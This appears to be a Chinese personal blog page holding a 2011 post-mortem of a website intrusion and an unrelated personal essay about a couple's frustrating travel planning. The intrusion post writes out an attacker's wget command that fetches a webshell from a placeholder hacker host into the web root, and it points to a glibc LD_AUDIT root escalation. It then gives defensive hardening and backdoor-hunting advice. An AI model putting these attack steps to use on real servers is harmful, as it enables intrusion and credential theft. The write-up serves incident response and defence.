网站安全

Apr 8th, 2011 | Comments

4月1日，一个疯狂好玩的日子，本应该娱乐娱乐，同学们又在轻松迎接清明节，结果却发生了网站遭入侵事件，也算咱们运气以及人品爆发，正好有同事再进行服务器更新结果发现可疑进程，才及时避免了网站用户数据的遭窃。

一、入侵基本过程：

1、利用web框架漏洞取得webshell；（至于是什么漏洞这里就不抖露。）

2、上传后门代码方法之一：wget htt://xx.heike.com/webshell.txt;  mv webshell.txt  /wwwroot/.xx/xxx.[html/jsp/asp….]；

3、www调用该页面，取得服务级用户权限，并查找架构配置文件和其中的数据库用户密码；

       网上有个现成的jsp脚本，截个图大家看看：

     

      详细功能可查看： jsp管理系统

4、到这里已经顺利的完成后门部署，可以执行远程普通用户shell了，后果已经相当可怕了。

       不过这还不算完，有了普通用户的权限，离root还遥远吗？

5、利用glibc2.X 漏洞进行提权获取root帐号；(目前测下来RH5、centos5、FC13、ubuntu10…. 都悲催的)

       怎么操作网上一查都是,关键字就是LD_AUDIT,同学们自己试试。

6、除了架构漏洞外，只要是被入侵后服务器，都还会留下其他多个后门隐藏在系统中、防不胜防。

二、一些处理意见

以下所写只是个人意见，一定也会存在不少疏忽和遗漏，只要你开启服务就必要有漏洞可以被利用。

1、第一时间当然是断开服务，切走流量，最好是能切断网络（如果可以的话），killall可疑进程；

2、ps -eafww中查找各个进程的父子关系，以便寻踪觅迹，找到后门代码（$0伪装进程名，这里不点透了，有经验的sa应该都知道。）

3、找后门代码的方法很多，我自己琢磨了几个，希望对大家以后查找防范有帮助；

       1）find /wwwroot/中的文件 按修改和创建时间查；

       2）在所有目录中查找以被利用的服务用户为属主的文件：比如apache nobody等等；

       3）grep -r 后门代码特征字段查找文件；

       4） file * 查找后缀名和内容不相符的文件；

       5）access log 可疑clientip/useragent/POST动作等等；

       6）抛砖引玉……

4、就算预防吧，其实只是提高入侵成本罢了；

       1）使用ssh key登录；

       2）限制服务器对外访问，什么要访问www？（用proxy限制访问的域名，iptables限制ip）总之开的越小越好，最好是不开。

       3）user一律nologin；开个服务要登录shell？

       4）卸载编译工具，好像狠了点提高了不少维护成本啦，那就改名吧。（gcc cc都改）

       5）glibc升级，我说说而已大家自己斟酌。

       6）熟悉selinux的 enforce起来；

晚上辗转反侧睡不着，自己琢磨的。

旅游的烦恼

Mar 30th, 2011 | Comments

也许这不仅仅是旅游的烦恼。

现实情况描述举例：

1、我们在好早好早以前就说要去旅游。清明节，或远或近，都ok。

2、中间规划过无数次苏州，最终以我来大姨妈、浮生四季被定光、天气不好等理由无限期延迟

3、向往过无数次厦门，基本上没有尝试过。

5、你说的要爬山，但是你也没认真尝试过。因为爬山的地方总归都是很远的，你怕长途的交通。

4、其实我从来没想过去很高级的地方，很贵的地方，什么云南、丽江、出国，其实我都没考虑过….我喜欢的地方，现在就是厦门和浮生四季，我知道你也很想让我开心的去旅游，去我想去的地方….你喜欢的地方，如果你真的很想去，而且不怕什么旅途的劳累，我也很乐意奉陪的。在我们两人心中这一点是很共通的，我们都希望有一次旅游，而且是希望彼此都开心的旅游，或者即使旅途中有什么不开心的，我们也可以一起面对和消化，最后变成回忆里快乐的点点滴滴。

以上为事实的背景。现在分析我们的讨论过程

1、首先，中午的时候，我就提出来了去苏州，然后游同里的想法。这个想法是基于以下几点：首先，我可以看看浮生四季，即使不能住在里面；其次，在我们彼此都预算不多，经济不宽裕的情况下，这是很实惠的一条线路。

2、我中午提出来了，然后你说ok。我说那你查查路线，你么反应。然后我晚上从苏州回来，你在家没出来，那我说我回家后晚上咱们讨论这个吧，你说好，我当时多开心啊，我觉得马上这些就能实现了。不过事实是，等我回家电话你，你不方便接电话，然后问你干嘛呢，你说你爸爸在看英雄。那么我无话说了，因为往往事实就是 你爸爸看电视=你在看电视   你永远是对我说，电视机摆在你面前，你就无法转移注意力。那个时候是8点多。然后11点左右你终于电话我了，问我怎么没电话，问我为啥没查苏州同里的行程。我一时觉得很郁闷，没回答你。但是我自己马上到电脑上开始查怎么交通。

3、这个时候，讨论开始了，11点了终于开始讨论了。我发现讨论真是个很可怕的东西。永远没有结果。跟开会一样。其实我没发现同里有什么不好，真的。但是你开始讨论起想爬山。既然你想爬山么，那么我去查天目山，查安吉。这些地方都很远，但是如果你真想去，我奉陪，我不是不喜欢山，我只是没你的新鲜感而已，但是陪着你，我始终是开心的。然后你又想到去湖州了，然后搞搞湖州没意思，然后发现你弟弟4月6号要和你一起过生日..这个客户的要求啊….可真难搞啊！我不是说你什么什么不好，我只是觉得这其中就是有种不对劲儿！一个项目总是完成不了实施不了，到底是PM的问题还是下面干活儿的人的问题呢！或者，这又有另外一个问题额，我和你之间存不存在决策者和执行者的分工呢！凡事靠商量，在这件事情上，真是让人伤透脑筋啊！！！

4、讨论半天，你的爬山计划很多你无法忍受的地方。那么，你开始责备我了。对吧，呵呵，我总是错的。我这次错在我没想法，没坚持。我为你想，我也错啊！所以，既然如此，那我说出了我的想法，我想去厦门，真心想去厦门。

5、好，去厦门，你说。我是真开心啊，因为梦想一下子从天上掉到头顶上了，唾手可及啊！我们兴冲冲的查机票，调整上班和休假的档期！查了很长时间，居然还是没定下来~~~~完了，12点了，你又困得不行了！！你一会儿说我来订，一会儿说明天再说，我的心真是哇凉哇凉…我说要么飞机票我出了，其余的你出，这样我晚上就能把一起都定下来了，你就睡觉就好了，我把我预想的档期发给你，亲爱的啊，你又不能确认了….你带着各种不确认睡觉去了…..

6、我真的有种撞墙的冲动啊！！！！！我一下子搞不清楚到底是我的问题还是你的问题。。。到底是我撒娇撒得不够欢畅呢，还是我的想法太多扰乱你思路，就该交给你全部解决啊！！！！还是我的策划能力太弱，你根本无法确认我给你提出的时间和方式啊~~~~！！！

7、我和你在一起那么久了啊，我真的很困惑啊，明明很简单的事情，出去旅游，多开心的事情啊，我们分工明确多好。比如,我看我们可以尝试以下步骤：

A：确定地点——确定后无论什么理由什么原因，可以不可以不要改了啊！！！！我们不是做设计啊！！

B：根据地点定预算，以及预算里面各自承担的比例 这次我们都还没讲过，或者之前零零散散讲过，但是具体怎么弄还没定。

C：各自的时间敲定！清明前后，我哪天请假都ok！

D：旅游项目启动，分工合作愉快。比如，我负责前期订票、定房间   你负责攻略  （当然这两个部分不是完全割裂的，有商有量，前三点的大条件不产生变更）

E、旅游去咯！！
